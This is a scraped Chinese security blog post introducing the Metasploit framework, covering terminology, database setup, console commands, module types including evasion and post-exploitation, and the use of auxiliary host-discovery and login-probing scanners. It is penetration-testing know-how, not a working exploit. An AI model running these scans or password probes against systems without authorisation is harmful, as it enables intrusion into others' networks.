1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" itemprop="url">渗透测试框架</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/MSF/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>MSF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Metasploit渗透框架</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-05-22T11:35:35.000Z" title="发表于 2023-05-22 19:35:35">2023-05-22</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-09-18T14:08:55.823Z" title="更新于 2023-09-18 22:08:55">2023-09-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Metasploit渗透框架"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/default_cover.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">Tianli GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/62582.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" itemprop="url">渗透测试框架</a><a href="/tags/MSF/" tabindex="-1" itemprop="url">MSF</a><h1 id="CrawlerTitle" itemprop="name headline">Metasploit渗透框架</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2023-05-22T11:35:35.000Z" title="发表于 2023-05-22 19:35:35">2023-05-22</time><time itemprop="dateCreated datePublished" datetime="2023-09-18T14:08:55.823Z" title="更新于 2023-09-18 22:08:55">2023-09-18</time></header><h1 id="常见名词解释"><a href="#常见名词解释" class="headerlink" title="常见名词解释"></a>常见名词解释</h1><blockquote>
+<p>POC ： Proof of Concept ，概念证明，用来证明漏洞存在的一段代码，没有攻击性</p>
+<p>EXP ： Exploit ，利用，利用系统漏洞进行攻击的动作、方式、方法，具有攻击性</p>
+<p>Payload ：有效载荷，指 Exploit 执行成功之后，真正在系统进行执行的代码或者指令</p>
+<p>Shellcode ：一段用于利用漏洞而执行的代码，为16进制的机器码，由于其建立正向&#x2F;反向 shell 而得名</p>
+<p>Client ：客户端</p>
+<p>Team Server ：服务端， C2 服务器， Beacon Payload 的控制器</p>
+<p>Beacon ：是 Cobalt Strike 运行在目标主机上的 payload ， Beacon 在隐蔽信道上我们提供服务，用于长期控制受感染主机。</p>
+<p>C2 ： Command &amp; Control Server 的简称，也就是命令与控制服务器</p>
+</blockquote>
+<h1 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h1><p>The Metasploit Framework 的简称。 MSF 高度模块化，即框架由多个 module 组成，是全球最受欢迎的渗透测试工具之一</p>
+<p>是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode ，并持续保持更新。</p>
+<p>metasploit 涵盖了渗透测试中全过程，你可以在这个框架下利用现有的 Payload进行一系列的渗透测试。</p>
+<h1 id="MSF框架结构"><a href="#MSF框架结构" class="headerlink" title="MSF框架结构"></a>MSF框架结构</h1><ul>
+<li>Kali-metasploit 框架目录路径</li>
+</ul>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p>
+</blockquote>
+<ol>
+<li>data：包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件。</li>
+<li>documentation：包含框架的可用文档。</li>
+<li>lib：metasploit的库文件夹。</li>
+<li>plugins：用来存放metasploit的插件。</li>
+<li>scripts：用来存放metasploit的脚本，包括meterpreter及其它脚本。</li>
+<li>tools：存放多种的命令行实用程序。</li>
+<li>modules：存储metasploit的模块文件。</li>
+</ol>
+<ul>
+<li>kali Metasploit 更新</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -v # 查看版本</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MSF配置数据库"><a href="#MSF配置数据库" class="headerlink" title="MSF配置数据库"></a>MSF配置数据库</h1><blockquote>
+<p>Metasploit支持使用数据库来保存渗透测试过程中获取的各种数据</p>
+</blockquote>
+<ul>
+<li>开启 postgresql 数据库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
+
+<p>-<br>  初始化 MSF 数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>
+
+<p>创建数据库用户： msf<br>创建数据库： msf<br>创建数据库： msf_test<br>创建配置文件： &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;config&#x2F;database.yml<br>创建保存MSF框架信息所需数据表</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305221954159.png" alt="image-20230522195442121"></p>
+<ul>
+<li>启动 msfconsole</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+
+<p>Msfconsole 是 Metasploit 框架用户接口，我们能通过 Msfconsole 接口使用Metasploit 中所有模块</p>
+<p>Msfconsole 主要用于:</p>
+<ol>
+<li><p>管理 Metasploit 数据库</p>
+</li>
+<li><p>管理会话</p>
+</li>
+<li><p>配置启动 Metasploit 模块</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305221955745.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307111159091.png" alt="image-20230522195517461"></p>
+</li>
+</ol>
+<p>启动 msfconsole 时，MSF会使用创建的 msf 用户自动登录到 msf 数据库</p>
+<ul>
+<li>查看数据库连接状态</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>连接到其他数据库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_connect 用户名:口令@服务器地址:端口/数据库名称</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSF命令查询"><a href="#MSF命令查询" class="headerlink" title="MSF命令查询"></a>MSF命令查询</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><blockquote>
+<ol>
+<li><p>show exploits – 查看所有可用的渗透攻击程序代码</p>
+</li>
+<li><p>show auxiliary – 查看所有可用的辅助攻击工具</p>
+</li>
+<li><p>[show ]options&#x2F;advanced – 查看该模块可用选项</p>
+</li>
+<li><p>show payloads – 查看该模块适用的所有载荷代码</p>
+</li>
+<li><p>show targets – 查看该模块适用的攻击目标类型</p>
+</li>
+<li><p>search – 根据关键字搜索某模块</p>
+</li>
+<li><p>info – 显示某模块的详细信息</p>
+</li>
+<li><p>use – 使用某渗透攻击模块</p>
+</li>
+<li><p>back – 回退</p>
+</li>
+<li><p>set&#x2F;unset – 设置&#x2F;禁用模块中的某个参数</p>
+</li>
+<li><p>setg&#x2F;unsetg – 设置&#x2F;禁用适用于所有模块的全局参数</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="数据库管理命令"><a href="#数据库管理命令" class="headerlink" title="数据库管理命令"></a>数据库管理命令</h2><blockquote>
+<ol>
+<li>msfdb init             # 启动并初始化数据库</li>
+<li>msfdb reinit           # 删除并重新初始化数据库</li>
+<li>msfdb delete           # 删除并停止使用数据库</li>
+<li>msfdb start           # 启动数据库</li>
+<li>msfdb stop             # 停止数据库</li>
+<li>msfdb status           # 检查服务状态</li>
+<li>msfdb run             # 启动数据库并运行msfconsole</li>
+</ol>
+</blockquote>
+<h2 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h2><blockquote>
+<ol>
+<li>?             帮助菜单</li>
+<li>banner       显示 Metasploit banner信息</li>
+<li>cd           更改当前工作目录</li>
+<li>color         切换颜色</li>
+<li>connect       与主机通信</li>
+<li>debug         显示对调试有用的信息</li>
+<li>exit         退出控制台</li>
+<li>features     显示可以选择加入的尚未发布的功能列表</li>
+<li>get           获取特定变量的值</li>
+<li>getg         获取全局变量的值</li>
+<li>grep         筛选以一条命令的输出</li>
+<li>help         帮助菜单</li>
+<li>history       显示命令历史记录</li>
+<li>load         加载框架插件</li>
+<li>quit         退出控制台</li>
+<li>repeat       重复一个命令列表</li>
+<li>route         通过一个session会话路由流量</li>
+<li>save         保存活动的数据存储</li>
+<li>sessions     导出会话列表并显示会话信息</li>
+<li>set           将一个特定环境的变量设置为一个值</li>
+<li>setg         将一个全局变量设置为一个值</li>
+<li>sleep         在指定的秒数内不执行任何操作</li>
+<li>spool         将控制台输出写入文件以及屏幕</li>
+<li>threads       查看和操作后台线程</li>
+<li>tips         显示有用的提示清单</li>
+<li>unload       卸载框架插件</li>
+<li>unset         取消设置的一个或多个变量</li>
+<li>unsetg       取消设置一个或多个全局变量</li>
+<li>version       显示框架和控制台库版本号</li>
+</ol>
+</blockquote>
+<h2 id="模块命令"><a href="#模块命令" class="headerlink" title="模块命令"></a>模块命令</h2><blockquote>
+<ol>
+<li>advanced     显示一个或多个模块的高级选项</li>
+<li>back         从当前环境返回</li>
+<li>clearm       清除模块堆栈</li>
+<li>favorite     将模块添加到最喜欢的模块列表中</li>
+<li>info         显示一个或多个模块的详细信息</li>
+<li>listm         列表中的模块栈</li>
+<li>loadpath     从路径中搜索并加载模块</li>
+<li>options       显示一个或多个模块全局选项</li>
+<li>popm         将最新的模块从堆栈中弹出并使其处于活动状态</li>
+<li>previous     将之前加载的模块设置为当前模块</li>
+<li>pushm         将活动模块或模块列表推送到模块堆栈</li>
+<li>reload_all   重新加载所有模块</li>
+<li>search       搜索模块名称和描述</li>
+<li>show         显示给定类型的的模块或所有模块</li>
+<li>use           通过名称或搜索词&#x2F;索引选择使用模块</li>
+</ol>
+</blockquote>
+<h2 id="作业命令"><a href="#作业命令" class="headerlink" title="作业命令"></a>作业命令</h2><blockquote>
+<ol>
+<li>handler       启动一个payload处理程序作为job</li>
+<li>jobs         显示和管理 jobs</li>
+<li>kill         杀掉一个job</li>
+<li>rename_job   重命名一个job</li>
+</ol>
+</blockquote>
+<h2 id="资源脚本命令"><a href="#资源脚本命令" class="headerlink" title="资源脚本命令"></a>资源脚本命令</h2><blockquote>
+<p>makerc       将从开始输入的命令保存到文件中<br>resource     运行存储在文件中的命令</p>
+</blockquote>
+<h2 id="后端数据库命令"><a href="#后端数据库命令" class="headerlink" title="后端数据库命令"></a>后端数据库命令</h2><blockquote>
+<ol>
+<li>analyze           分析关于一个特定地址或地址范围的数据库信息</li>
+<li>db_connect       连接到一个现有的数据服务</li>
+<li>db_disconnect     与当前的数据服务断开连接</li>
+<li>db_export         导出一个包含数据库内容的文件</li>
+<li>db_import         导入扫描结果文件（文件类型将被自动检测）</li>
+<li>db_nmap           执行nmap并自动记录输出</li>
+<li>db_rebuild_cache 重建数据库存储的模块缓存（已废弃）</li>
+<li>db_remove         删除已保存的数据服务条目</li>
+<li>db_save           将当前的数据服务连接保存为默认，以便在启动时重新连接</li>
+<li>db_status         显示当前的数据服务状态</li>
+<li>hosts             列出数据库中的所有主机</li>
+<li>loot             列出数据库中的所有战利品</li>
+<li>notes             列出数据库中的所有笔记</li>
+<li>services         列出数据库中的所有服务</li>
+<li>vulns             列出数据库中的所有漏洞</li>
+<li>workspace         在数据库工作空间之间切换</li>
+</ol>
+</blockquote>
+<h2 id="后端凭证命令"><a href="#后端凭证命令" class="headerlink" title="后端凭证命令"></a>后端凭证命令</h2><blockquote>
+<p>creds         列出数据库中的所有凭证</p>
+</blockquote>
+<h2 id="开发者命令"><a href="#开发者命令" class="headerlink" title="开发者命令"></a>开发者命令</h2><blockquote>
+<ol>
+<li>edit         用首选编辑器编辑当前模块或文件</li>
+<li>irb           在当前环境下打开一个交互式Ruby shell</li>
+<li>log           如果可能的话，将framework.log分页显示到最后。</li>
+<li>pry           在当前模块或框架上打开 Pry 调试器</li>
+<li>reload_lib   从指定路径重新加载Ruby库文件</li>
+<li>time         运行一个特定命令所需的时间</li>
+</ol>
+</blockquote>
+<h2 id="攻击载荷命令"><a href="#攻击载荷命令" class="headerlink" title="攻击载荷命令"></a>攻击载荷命令</h2><blockquote>
+<ol>
+<li>check         检查一个目标是否易受攻击</li>
+<li>generate     生成一个有效载荷</li>
+<li>reload       从磁盘重新加载当前的模块</li>
+<li>to_handler   用指定的有效载荷创建一个处理程序</li>
+</ol>
+</blockquote>
+<h1 id="MSF模块介绍"><a href="#MSF模块介绍" class="headerlink" title="MSF模块介绍"></a>MSF模块介绍</h1><blockquote>
+<p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。MSF所有的漏洞测试都是基于模块。</p>
+</blockquote>
+<p>Metasploit 中有以下 7 种不同的模块类型</p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>模块功能</th>
+<th>模块介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>auxiliary</td>
+<td>辅助模块</td>
+<td>辅助渗透（端口扫描、登录密码爆破、漏洞验证等）</td>
+</tr>
+<tr>
+<td>exploits</td>
+<td>漏洞利用模块</td>
+<td>包含主流的漏洞利用脚本，通常是对某些可能存在漏洞 的目标进行漏洞利用。命名规则：操作系统&#x2F;各种应用协议分类</td>
+</tr>
+<tr>
+<td>payloads</td>
+<td>攻击载荷</td>
+<td>主要是攻击成功后在目标机器执行的代码，比如反弹 shell的代码</td>
+</tr>
+<tr>
+<td>post</td>
+<td>后渗透阶段模块</td>
+<td>漏洞利用成功获得meterpreter之后，向目标发送的一些 功能性指令，如：提权等</td>
+</tr>
+<tr>
+<td>encoders</td>
+<td>编码器模块</td>
+<td>主要包含各种编码工具，对payload进行编码加密，以便 绕过入侵检测和过滤系统</td>
+</tr>
+<tr>
+<td>evasion</td>
+<td>躲避模块</td>
+<td>用来生成免杀payload</td>
+</tr>
+<tr>
+<td>nops</td>
+<td>空指令模块</td>
+<td>空指令就是空操作，提高paylaod稳定性及维持大小</td>
+</tr>
+</tbody></table>
+<ul>
+<li>auxiliary(辅助模块)</li>
+</ul>
+<p>用于辅助操作的模块，辅助模块能在渗透之前得到目标系统丰富的情报信息，从而发起更具目标性的精准攻击。</p>
+<p>例如针对各种网络服务的扫描与查点、网络扫描、枚举、漏洞扫描、登录口令暴力破解、模糊测试、爬虫遍历、数据提取等</p>
+<p>此外，辅助模块中还包括一些无须加载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。</p>
+<ul>
+<li>exploits(漏洞利用模块)</li>
+</ul>
+<p>用于利用漏洞和传递有效负载的模块。利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对目标系统访问控制权的代码组件。</p>
+<p>有远程漏洞利用、本地漏洞利用、权限提升漏洞利用、客户端漏洞利用、Web 应用程序漏洞利用和许多其他漏洞。</p>
+<ul>
+<li>payloads(攻击载荷)</li>
+</ul>
+<p>用于在利用期间执行操作的模块。攻击载荷是在渗透攻击成功后在目标系统运行的一段植入代码，通常是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的 ShellCode 代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成 ShellCode 中实现的单一功能。</p>
+<p>例如建立 Meterpreter 会话、反向 shell 、执行命令、下载和执行程序等。</p>
+<ul>
+<li>post(后渗透阶段模块)</li>
+</ul>
+<p>用于在拿到权限后进行后渗透利用操作的模块，例如凭证&#x2F;哈希转储、本地权限提升、后门安装、敏感数据提取、网络流量隧道（代理）、键盘记录、屏幕捕获和许多其他操作。</p>
+<ul>
+<li>encoders(编码器模块)</li>
+</ul>
+<p>用于有效负载编码和加密的模块，例如 base64 、 XOR 、 shikata_ga_nai 等。这有助于混淆以规避防病毒或 NIDS （网络入侵检测系统）、 EDR （端点检测和响应）等防御。</p>
+<ul>
+<li>evasion(规避模块)</li>
+</ul>
+<p>用于规避防御的模块，例如防病毒规避、 AppLocker 绕过、软件限制策略 (SRP) 绕过等。</p>
+<ul>
+<li>nops(空指令模块)</li>
+</ul>
+<p>用于生成无害、良性的“无操作”指令的模块，例如用于填充目的、在利用期间在内存中滑动等。用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。</p>
+<p>是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令。</p>
+<p>在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，从而提高渗透攻击的可靠性。</p>
+<h1 id="MSF辅助扫描模块-auxiliary"><a href="#MSF辅助扫描模块-auxiliary" class="headerlink" title="MSF辅助扫描模块 - auxiliary"></a>MSF辅助扫描模块 - auxiliary</h1><h2 id="MSF主机发现"><a href="#MSF主机发现" class="headerlink" title="MSF主机发现"></a>MSF主机发现</h2><ul>
+<li>模块路径</li>
+</ul>
+<blockquote>
+<p>modules&#x2F;auxiliary&#x2F;scanner&#x2F;discovery&#x2F;</p>
+</blockquote>
+<ul>
+<li>搜索模块</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search aux /scanner/discovery</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222219102.png" alt="image-20230522221713596"></p>
+<p>arp_sweep：使用arp请求枚举本地局域网中的所有活跃主机</p>
+<p>udp_sweep：通过发送UDP数据包探查指定主机是否活跃，并发现主机上的udp服务。</p>
+<ul>
+<li>模块使用</li>
+</ul>
+<blockquote>
+<p>arp_sweep 模块使用方法</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">set RHOSTS xx.xx.xx.xx/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>设置好参数后输入 run 启动扫描器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305232219168.png" alt="image-20230523221950951"></p>
+<h2 id="MSF服务扫描"><a href="#MSF服务扫描" class="headerlink" title="MSF服务扫描"></a>MSF服务扫描</h2><ul>
+<li>服务扫描</li>
+</ul>
+<p>确定开放端口后，对相应端口上所运行的服务信息进行挖掘</p>
+<ul>
+<li>模块搜索</li>
+</ul>
+<p>在 Metasploit 的 Scanner 辅助模块中，用于服务扫描和查点的工具常以[service_name]_version 和 [service_name]_login 命名</p>
+<blockquote>
+<p>[service_name]_version ：可用于遍历网络中包含了某种服务的主机，并进一步确定服务的版本</p>
+<p>[service_name]_login ：可对某种服务进行口令探测攻击</p>
+</blockquote>
+<p>在MSF终端中可以输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search _version</span><br></pre></td></tr></table></figure>
+
+<p>查看所有可用的服务探测模块</p>
+<p>在MSF终端中可以输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search _login</span><br></pre></td></tr></table></figure>
+
+<p>可查看所有服务登录口令探测模块</p>
